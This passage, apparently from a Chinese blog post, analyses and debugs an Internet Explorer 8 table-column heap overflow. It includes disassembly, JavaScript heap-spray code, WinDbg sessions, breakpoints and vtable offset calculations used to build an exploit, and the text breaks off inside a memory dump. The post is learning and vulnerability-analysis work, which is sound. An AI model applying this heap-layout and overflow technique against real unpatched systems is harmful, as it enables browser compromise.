0</span><br><span class="line">.text:74EC5B5B                 mov     [ebp+var_24], eax;----&gt;作为后面AdjustForCol函数的参数</span><br><span class="line">.text:74EC5B5E                 jz      short loc_74EC5B7A</span><br><span class="line">.text:74EC5B60                 mov     eax, [ebp+arg_8]</span><br><span class="line">.text:74EC5B63                 cmp     eax, 1</span><br><span class="line">.text:74EC5B66                 jle     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B68                 dec     eax</span><br><span class="line">.text:74EC5B69                 cmp     [ebp+var_14], eax</span><br><span class="line">.text:74EC5B6C                 jnz     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B6E                 imul    eax, [ebp+var_C]</span><br><span class="line">.text:74EC5B72                 mov     ecx, [ebp+var_2C]</span><br><span class="line">.text:74EC5B75                 sub     ecx, eax        ; this</span><br><span class="line">.text:74EC5B77                 mov     [ebp+var_C], ecx</span><br><span class="line">.text:74EC5B7A                 push    [ebp+var_3C]    ; struct CCalcInfo *</span><br><span class="line">.text:74EC5B7D                 mov     eax, [ebp+var_34]</span><br><span class="line">.text:74EC5B80                 push    [ebp+arg_4]     ; int</span><br><span class="line">.text:74EC5B83                 mov     esi, [ebp+var_24]</span><br><span class="line">.text:74EC5B86                 push    [ebp+var_C]     ; ----&gt;前面经width计算得到的Copydata,即用于复制到vulheap的数据内容。</span><br><span class="line">.text:74EC5B89                 call    ?AdjustForCol@CTableColCalc@@QAEXPBVCWidthUnitValue@@HPAVCCalcInfo@@H@Z ; CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)</span><br></pre></td></tr></table></figure></p>
+<p>复制的内容相当于<code>width * 100</code>得到的数值，比如此处为0x41，则复制内容为<code>0x41 * 1000=0x1004</code>。<br>在AdjustForCol中，会以1000 * 0x1c位计数循环向vulheap写入数据，最终造成heap溢出。<br>再g就崩溃了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173750.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173811.png" alt=""><br>总结</p>
+<ol>
+<li>当页面加载，CTableLayout::CalculateMinMax被首次调用，col的span属性被初始化为1，此时spansum=1,spancmp=0</li>
+<li>由于(spancmp&gt;&gt;2)&lt;spansum,即0&lt;1,调用EnsureSizeWorker函数分配大小为<code>0x1c * spansum</code>的内存,但至少分配<code>0x1C * 4=0x70</code>大小的内存块。</li>
+<li>分配内存后，spancmp=spansum * 4 = 4,此时(spancmp&gt;&gt;2)==spansum,即4/4==1，因此不再分配内存</li>
+<li>调用over_trigger，CTableLayout::MinMax第二次被调用，但spansum和spancmp未变，而span被更改为1000，在复制内容为<code>width * 100</code>的数据到分配缓冲区时，会以span为循环计数器写vulheap堆块，但是<code>1000 * 0x1C &gt; 0x70</code>，最终造成堆溢出。</li>
+</ol>
+<p>经过调试，泉哥142页<code>shr eax,2</code>理解错了，那个shr是右移的意思，而泉哥写的是左移运算符&lt;&lt;</p>
+<h2 id="实现漏洞利用"><a href="#实现漏洞利用" class="headerlink" title="实现漏洞利用"></a>实现漏洞利用</h2><p>关于exp的编写请参考漏洞战争，这里只调试一些关键思路。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"test"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        &lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">                </span><br><span class="line">		<span class="keyword">var</span> leak_index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> dap = <span class="string">"EEEE"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( dap.length &lt; <span class="number">480</span> ) dap += dap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> padding = <span class="string">"AAAA"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( padding.length &lt; <span class="number">480</span> ) padding += padding;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filler = <span class="string">"BBBB"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( filler.length &lt; <span class="number">480</span> ) filler += filler;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//spray</span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">var</span> rra = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>);</span><br><span class="line">        div_container.style.cssText = <span class="string">"display:none"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// E</span></span><br><span class="line">            rra[i] = dap.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// S, bstr = A</span></span><br><span class="line">            arr[i] = padding.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// A, bstr = B</span></span><br><span class="line">            arr[i+<span class="number">1</span>] = filler.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// B</span></span><br><span class="line">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">            div_container.appendChild(obj);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">200</span>; i&lt;<span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span><br><span class="line">            rra[i] = <span class="literal">null</span>;</span><br><span class="line">            CollectGarbage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这部分主要是用来构造堆布局,构造结果如下。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-075240.jpg" alt=""><br>然后从中间（200）开始释放EEEE…，腾出空间。<br>释放的位置就是为了在分配vulheap时能够占用到释放位置中的一个，当溢出时就可以占用到后面的字符串和CButtonLayout。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 6.3.9600.17200 X86</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">*** wait with pending attach</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">ModLoad: 013c0000 01466000   C:\Program Files\Internet Explorer\iexplore.exe</span><br><span class="line">(c0.ea8): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=7ff96000 ebx=00000000 ecx=00000000 edx=77a0d23d esi=00000000 edi=00000000</span><br><span class="line">eip=779a3540 esp=07abfe00 ebp=07abfe2c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">779a3540 cc              int     3</span><br><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; .symfix</span><br><span class="line">0:021&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">...........</span><br><span class="line">0:021&gt; sxe ld:jscript</span><br><span class="line">0:021&gt; g</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">(fd4.630): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=0014f620 edx=779b64f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=77a0e60e esp=0014f63c ebp=0014f668 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">77a0e60e cc              int     3</span><br><span class="line">1:014&gt;  lmm jscript</span><br><span class="line">start    end        module name</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 6f640000 6f6f2000   C:\Windows\System32\jscript.dll</span><br><span class="line">eax=0345de14 ebx=00000000 ecx=00000007 edx=00000000 esi=7ffda000 edi=0345e22c</span><br><span class="line">eip=779b64f4 esp=0345e144 ebp=0345e198 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">779b64f4 c3              ret</span><br><span class="line">1:023&gt; lmm jscript</span><br><span class="line">start    end        module name</span><br><span class="line">6f640000 6f6f2000   jscript    (deferred)</span><br></pre></td></tr></table></figure></p>
+<p>先通过windbg attach ie，然后打开childdbg，因为刚开始IE还没有加载jsript.dll，所以可以先设置加载jscript.dll时断下（sxe）,按g运行，拖入exp。<br>lmm确定载入后，再对JSCollectGarbage下断（bp),然后g运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bp jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=0345f0f0 ebx=0345f0a0 ecx=0136e0a0 edx=6f6c8555 esi=0136ff40 edi=0345f090</span><br><span class="line">eip=6f6c8555 esp=0345f050 ebp=0345f0b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsCollectGarbage:</span><br><span class="line">6f6c8555 a180d06d6f      mov     eax,dword ptr [jscript!g_luTls (6f6dd080)] ds:0023:6f6dd080=00000038</span><br></pre></td></tr></table></figure></p>
+<p>继续下断，找到vulheap分配的位置，具体分析参考漏洞战争。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bl</span><br><span class="line"> 0 e 6f6c8555     0001 (0001)  1:**** jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; bd 0</span><br><span class="line">1:023&gt; bu ntdll!RtlFreeHeap &quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br><span class="line">1:023&gt; bu mshtml!CTableLayout::CalculateMinMax+0x16d &quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br><span class="line">1:023&gt; bu jscript!JsStrSubString</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; .logopen</span><br><span class="line">Opened log file &apos;dbgeng.log</span><br></pre></td></tr></table></figure>
+<p>打开log文件做记录，另外我在jscript!JsStrSubString下了额外的断点。<br>此外改动一下exp，加个alert。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">			alert(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">			obj_col.span = <span class="number">19</span>;</span><br></pre></td></tr></table></figure></p>
+<p>断下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">free heap</span><br><span class="line">0156d718  ff ff ff ff ff ff ff ff-80 32 0c 04 00 00 00 00  .........2......</span><br><span class="line">free heap</span><br><span class="line">040c3280  80 59 ed 69 00 00 00 00-00 00 00 00 c7 59 e9 00  .Y.i.........Y..</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">eax=0375f108 ebx=0375efa0 ecx=02f01318 edx=6eb289cb esi=02f05800 edi=0375f2b4</span><br><span class="line">eip=6eb289cb esp=0375ef50 ebp=0375efb4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsStrSubstring:</span><br><span class="line">6eb289cb 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; .logclose</span><br><span class="line">Closing open log file dbgeng.log</span><br></pre></td></tr></table></figure>
+<p>保存之后，最后一个vulheap就是我们要找的.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-175951.png" alt=""></p>
+<p>另外为了确定虚表偏移,直接动态找一下吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; x mshtml!CButtonLayout::*</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetThemeClassId (&lt;no parameter info&gt;)</span><br><span class="line">6a0c0d9d          mshtml!CButtonLayout::GetInsets (&lt;no parameter info&gt;)</span><br><span class="line">69ff3c90          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetAutoSize (&lt;no parameter info&gt;)</span><br><span class="line">6a2562f6          mshtml!CButtonLayout::HitTestContent (&lt;no parameter info&gt;)</span><br><span class="line">6a02b4b7          mshtml!CButtonLayout::DrawClientBackground (&lt;no parameter info&gt;)</span><br><span class="line">69ff9251          mshtml!CButtonLayout::Init (&lt;no parameter info&gt;)</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetMultiLine (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d8          mshtml!CButtonLayout::s_layoutdesc = &lt;no type information&gt;</span><br><span class="line">6a2562e6          mshtml!CButtonLayout::GetBtnHelper (&lt;no parameter info&gt;)</span><br><span class="line">6a256121          mshtml!CButtonLayout::GetFocusShape (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d1          mshtml!CButtonLayout::GetLayoutDesc (&lt;no parameter info&gt;)</span><br><span class="line">6a256281          mshtml!CButtonLayout::DoLayout (&lt;no parameter info&gt;)</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetWordWrap (&lt;no parameter info&gt;)</span><br><span class="line">69ff3af8          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a02b4f2          mshtml!CButtonLayout::DrawClient (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`scalar deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a255f61          mshtml!CButtonLayout::DrawClientBorder (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`vector deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a0c2394          mshtml!CButtonLayout::GetDefaultSize (&lt;no parameter info&gt;)</span><br></pre></td></tr></table></figure></p>
+<p><strong>奇怪的是，有两个虚表，这里我也不知道为什么……</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">69e80000 6a432000   mshtml     (pdb symbols)          C:\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb</span><br></pre></td></tr></table></figure></p>
+<p>69ff3af8-69e80000=0x00173af8<br>这和泉哥书上说的中文版win7+ie8环境中的偏移也是一致的。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-155223.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-155242.png" alt=""><br><strong>然后这我就很不解了……</strong><br><strong>此外看一下vulheap。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">1:026&gt; db 03f2ae30 l101c</span><br><span class="line">03f2ae30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2ae40  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2ae50  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2ae60  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2ae70  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2ae80  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2ae90  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2aea0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2aeb0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2aec0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2aed0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2aee0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2aef0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af00  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2af10  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2af20  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2af30  04 10 00 00 04 10 00 00-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2af40  02 00 00 00 48 00 01 00-04 10 00 00 04 10 00 00  ....H...........</span><br><span class="line">03f2af50  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2af60  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af70  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2af80  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2af90  41 00 41 00 41 00 41 00-48 00 01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2afa0  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2afb0  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2afc0  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2afd0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2afe0  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2aff0  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b000  41 00 41 00 41 00 41 00-48 00 